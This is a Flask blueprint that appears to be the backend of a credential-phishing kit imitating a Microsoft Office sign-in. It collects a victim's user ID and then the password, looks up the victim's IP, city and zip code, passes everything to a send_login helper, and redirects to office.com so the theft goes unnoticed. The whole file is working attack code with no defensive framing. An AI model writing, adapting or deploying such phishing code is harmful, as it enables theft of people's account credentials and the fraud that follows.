from urllib import response
from flask import Blueprint, session, render_template, request, redirect, url_for
from .utils import send_login
from requests import get


portals = Blueprint('portals', __name__)


@portals.route('/oauth/signin', methods=['GET','POST'])
def signin():
    if request.method == 'POST':
        user_id = request.form['user-id']
        if user_id:
            session['username'] = user_id
            return redirect(url_for('portals.password'))
    return render_template('signin.html')

@portals.route('/signin/syncing', methods=['GET','POST'])
def syncing():
    return render_template('syncing.html')

@portals.route('/oauth/password', methods=['GET','POST'])
def password():
    response = get('http://ip-api.com/json')
    data = response.json()
    country = data['country']
    city = data['city']
    zipcode = data['zip']
    ip = data['query']
    username = session['username']
    if request.method == 'POST':
        password = request.form.get('password')
        if password:
            send_login(username, password, country, city,zipcode,ip)
            return redirect('https://www.office.com/')
    return render_template('password.html', username=username)